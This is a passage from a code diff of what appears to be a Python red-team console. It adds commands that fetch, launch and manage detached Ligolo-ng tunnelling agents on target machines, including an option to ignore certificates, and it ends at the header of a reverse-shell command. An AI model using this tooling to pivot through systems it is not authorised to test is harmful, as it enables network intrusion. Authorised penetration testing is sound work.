+            else:
+                forwarded.append(arg)
+            idx += 1
+
+        custom_forwarded = list(forwarded)
+        if profile_name:
+            profile = self.ligolo_assets.get_profile(profile_name)
+            profile_args = ["-connect", str(profile["connect"])]
+            if profile.get("ignore_cert"):
+                profile_args.append("-ignore-cert")
+            elif profile.get("fingerprint"):
+                profile_args.extend(["-accept-fingerprint", str(profile["fingerprint"])])
+            if profile.get("retry", True):
+                profile_args.append("-retry")
+            forwarded = profile_args + forwarded
+
+        if remote and not source:
+            raise ValueError("--remote requires a target-side agent path")
+        if not source:
+            architecture = architecture or self._ligolo_architecture()
+            source = self.ligolo_assets.latest_installed(architecture)
+            if not source:
+                asset = self.ligolo_assets.fetch(version=version, architecture=architecture)
+                source = asset["path"]
+
+        noconsolation_args = ["--detached", "native"]
         if remote:
-            forwarded.append("--remote")
-        forwarded.extend(args)
-        return self.noconsolation(subprocess.list2cmdline(forwarded))
+            noconsolation_args.append("--remote")
+        noconsolation_args.append(source)
+        noconsolation_args.extend(forwarded)
+        result = self.noconsolation(subprocess.list2cmdline(noconsolation_args))
+        job_id = str(result.get("job_id", "")) if isinstance(result, dict) else ""
+        if job_id and hasattr(self, "job_registry"):
+            record = self.job_registry.resolve(job_id)
+            metadata = dict(record.metadata)
+            metadata.update({"profile": profile_name, "remote": remote})
+            self.job_registry.update(
+                record,
+                kind="ligolo",
+                name=PureWindowsPath(source).name or Path(source).name or "agent.exe",
+                metadata=metadata,
+            )
+            restart_args = ["--remote" if remote else "--agent", source]
+            if profile_name:
+                restart_args.extend(["--profile", profile_name])
+            restart_args.extend(custom_forwarded)
+            self._ligolo_specs[job_id] = subprocess.list2cmdline(restart_args)
+            result["kind"] = "ligolo"
+        return result
+
+    def _ligolo_list(self):
+        records = [self._refresh_job(record) for record in self.job_registry.list(kind="ligolo")]
+        self.write_info(c(C + BLD, "\n  [Managed Ligolo-ng Agents]"))
+        if not records:
+            self.write_info("  No tracked Ligolo-ng agents.")
+        for record in records:
+            profile = record.metadata.get("profile") or "custom"
+            self.write_info(
+                f"  {c(Y, record.job_id)} | {record.status.ljust(9)} | "
+                f"PID {record.pid or '?'} | profile: {profile} | {record.name}"
+            )
+        self.write_info("")
+        return {"status": "completed", "agents": records}
+
+    def ligolo(self, cmdline: str):
+        """Fetch, launch, track, restart, and clean up detached Ligolo-ng agents."""
+        args = split_args(cmdline)
+        subcommands = {"start", "fetch", "list", "status", "stop", "restart", "cleanup", "profile"}
+        subcmd = args[0].lower() if args and args[0].lower() in subcommands else "start"
+        rest = args[1:] if args and args[0].lower() in subcommands else args
+        try:
+            if subcmd == "start":
+                return self._ligolo_start(rest)
+            if subcmd == "fetch":
+                return self._ligolo_fetch(rest)
+            if subcmd == "profile":
+                return self._ligolo_profile(rest)
+            if subcmd == "list" and not rest:
+                return self._ligolo_list()
+            if subcmd == "status" and len(rest) == 1:
+                record = self._refresh_job(self.job_registry.resolve(rest[0], kind="ligolo"))
+                self.write_info(f"  Ligolo job {record.job_id}: {record.status} | PID {record.pid or '?'}")
+                return {"status": "completed", "job": record}
+            if subcmd == "stop" and len(rest) == 1:
+                if rest[0].lower() == "all":
+                    stopped = 0
+                    for record in self.job_registry.list(kind="ligolo"):
+                        if record.status == "running":
+                            self._stop_job(record)
+                            stopped += 1
+                    return {"status": "completed", "stopped": stopped}
+                return self._stop_job(self.job_registry.resolve(rest[0], kind="ligolo"))
+            if subcmd == "restart" and len(rest) == 1:
+                record = self.job_registry.resolve(rest[0], kind="ligolo")
+                spec = self._ligolo_specs.get(record.job_id)
+                if not spec:
+                    raise ValueError("restart metadata is unavailable after reconnect; start the agent again explicitly")
+                if record.status == "running":
+                    self._stop_job(record)
+                return self._ligolo_start(split_args(spec))
+            if subcmd == "cleanup" and not rest:
+                for record in self.job_registry.list(kind="ligolo"):
+                    if record.status == "running":
+                        self._stop_job(record)
+                removed = self.job_registry.cleanup_terminal(kind="ligolo")
+                self.write_info(f"  [+] Stopped Ligolo agents and removed {len(removed)} record(s).")
+                return {"status": "completed", "removed": removed}
+            raise ValueError(
+                "usage: !ligolo [start [--agent PATH|--remote PATH] [--profile NAME] [ARG..]|"
+                "fetch [--version V] [--arch A]|list|status ID|stop ID|restart ID|cleanup|profile ...]"
+            )
+        except (KeyError, OSError, RuntimeError, ValueError) as exc:
+            self.write_error(str(exc).strip("'"))
+            return {"status": "error", "error": str(exc)}
 
     # ── !revshell ─────────────────────────────────────────────────────────────
     def revshell(self, cmdline: str):
